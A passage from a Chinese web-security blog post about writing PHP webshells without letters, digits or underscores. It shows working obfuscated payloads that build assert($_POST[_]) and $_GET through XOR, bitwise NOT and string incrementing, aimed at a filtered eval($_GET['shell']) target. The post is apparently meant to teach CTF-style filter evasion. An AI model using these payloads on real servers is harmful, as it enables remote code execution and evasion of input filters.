+<h3 id="不用数字构造出数字"><a href="#不用数字构造出数字" class="headerlink" title="不用数字构造出数字"></a>不用数字构造出数字</h3><p>利用了PHP弱类型特性，true的值为1，故true+true==2。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)</span><br><span class="line">print($_)</span><br><span class="line">print($_/$_)</span><br><span class="line"></span><br><span class="line">结果会输出：2 1</span><br></pre></td></tr></table></figure></p>
+<p>在php中未定义的变量默认值为null，null==false==0，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++;</span><br><span class="line">print($_);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果会输出：1</span><br></pre></td></tr></table></figure></p>
+<h3 id="不用数字和字母的-shell"><a href="#不用数字和字母的-shell" class="headerlink" title="不用数字和字母的 shell"></a>不用数字和字母的 shell</h3><p>在讲不用数字，字母和下划线写 shell 之前，先了解下不用数字和字母写 shell。毕竟学习都是循序渐进的。而且用不用下划线其实问题不大，因为 PHP 太灵活了。代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) </span><br><span class="line">&#123; eval($_GET[&apos;shell&apos;]);&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>思路</strong></p>
+<p><strong>将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，如 “assert”，然后动态执行即可。</strong></p>
+<h5 id="非字母、数字的字符异或出字母"><a href="#非字母、数字的字符异或出字母" class="headerlink" title="非字母、数字的字符异或出字母"></a>非字母、数字的字符异或出字母</h5><p>不可打印字符，用 url 编码表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;</span><br><span class="line">$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure></p>
+<p>还可以用更短的字符，下面会用到。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;//_GET</span><br></pre></td></tr></table></figure></p>
+<p> ^ 会对两边对应的字符串进行异或。</p>
+<h6 id="非字母、数字的字符取反出字母"><a href="#非字母、数字的字符取反出字母" class="headerlink" title="非字母、数字的字符取反出字母"></a>非字母、数字的字符取反出字母</h6><p>利用的是 UTF-8 编码的某个汉字，将其中的某个字符取出来，取反为字母。一个汉字的 utf8 是三个字节，{2} 表示第 3 个字节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);//$__=2</span><br><span class="line">$_=$__/$__;//$_=1</span><br><span class="line">$___=&quot;瞰&quot;;</span><br><span class="line">$____=&quot;和&quot;;</span><br><span class="line">print(~($___&#123;$_&#125;));</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">print(~($____&#123;$__&#125;));</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);//$__2</span><br><span class="line">$_=$__/$__;//$_1</span><br><span class="line"></span><br><span class="line">$____=&apos;&apos;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);//$____=assert</span><br><span class="line"></span><br><span class="line">$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);//$_____=_POST</span><br><span class="line"></span><br><span class="line">$_=$$_____;//$_=$_POST</span><br><span class="line">$____($_[$__]);//assert($_POST[2])</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里也有一种简短的写法 $&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125; 它等于 $_GET。这里相当于直接把 utf8 编码的某个字节提取出来统一进行取反。</span><br></pre></td></tr></table></figure>
+<h3 id="递增／递减运算符"><a href="#递增／递减运算符" class="headerlink" title="递增／递减运算符"></a>递增／递减运算符</h3><p>这种方法很明显的缺点就是需要大量的字符。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/9113981-2805feb88b65647a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
+<p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
+<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>
+<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
+<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> echo &apos; &apos;.[]</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-5064ea460f30c5a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>
+<p>参考：<br><a href="https://www.liuxianglai.top/?p=145" target="_blank" rel="noopener">https://www.liuxianglai.top/?p=145</a><br><a href="https://blog.csdn.net/weixin_42665043/article/details/82142242" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42665043/article/details/82142242</a><br><a href="http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a><br><a href="https://www.aqbeta.com/data/201808/153380340813497.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.aqbeta.com/data/201808/153380340813497.html?tdsourcetag=s_pctim_aiomsg</a></p>
+
+      
+    </div>
+    
+    
+    
+		
+		<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/10/03/phpshell/">php编写不使用字母下划线的shell</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 berlin 的个人博客">berlin</a></p>
+  <p><span>发布时间:</span>2018年10月03日 - 16:10</p>
+  <p><span>最后更新:</span>2018年10月03日 - 16:10</p>
+  <p><span>原始链接:</span><a href="/2018/10/03/phpshell/" title="php编写不使用字母下划线的shell">http://yoursite.com/2018/10/03/phpshell/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2018/10/03/phpshell/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+      
+    </div> 
+		
+    
+		
+		<div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+    </div>
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"><i class="fa fa-tag"></i> web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/15/unserialize/" rel="next" title="php反序列化漏洞">
+                <i class="fa fa-chevron-left"></i> php反序列化漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=RA-5ba8b3dc680529ed" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNzU3MS8xNDEwMw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/zhenzhen.jpg"
+                alt="berlin" />
+            
+              <p class="site-author-name" itemprop="name">berlin</p>
+              <p class="site-description motion-element" itemprop="description">每天都是美好的一天</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://zhoubolin.github.io" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1057032770@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/c531954533ea" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" title="csdn">
+                      
+                        <i class="fa fa-fw fa-globe"></i>csdn</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jianshu.com/u/c531954533ea" title="简书" target="_blank">简书</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.liuxianglai.top/" title="Smiles" target="_blank">Smiles</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zbojia.com/" title="R1ka" target="_blank">R1ka</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sunraycanter.top/" title="UnKnown" target="_blank">UnKnown</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shaobaobaoer.cn/" title="shaobaobao" target="_blank">shaobaobao</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://kuraraneko.github.io/" title="n3k0" target="_blank">n3k0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.virtua1.cn/" title="virtua1" target="_blank">virtua1</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+					<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=574566207&auto=1&height=66"></iframe>
+					
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#不用数字和字母写shell的一道实例："><span class="nav-number">1.</span> <span class="nav-text">不用数字和字母写shell的一道实例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不用数字，字母和下划线写shell的实例"><span class="nav-number">2.</span> <span class="nav-text">不用数字，字母和下划线写shell的实例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP中取反-的概念"><span class="nav-number"></span> <span class="nav-text">PHP中取反(~)的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不用数字构造出数字"><span class="nav-number"></span> <span class="nav-text">不用数字构造出数字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不用数字和字母的-shell"><span class="nav-number"></span> <span class="nav-text">不用数字和字母的 shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#非字母、数字的字符异或出字母"><span class="nav-number">0.1.</span> <span class="nav-text">非字母、数字的字符异或出字母</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#非字母、数字的字符取反出字母"><span class="nav-number">0.1.1.</span> <span class="nav-text">非字母、数字的字符取反出字母</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#递增／递减运算符"><span class="nav-number"></span> <span class="nav-text">递增／递减运算符</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">berlin</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!--
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+	
+	
+  undefined
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</html>
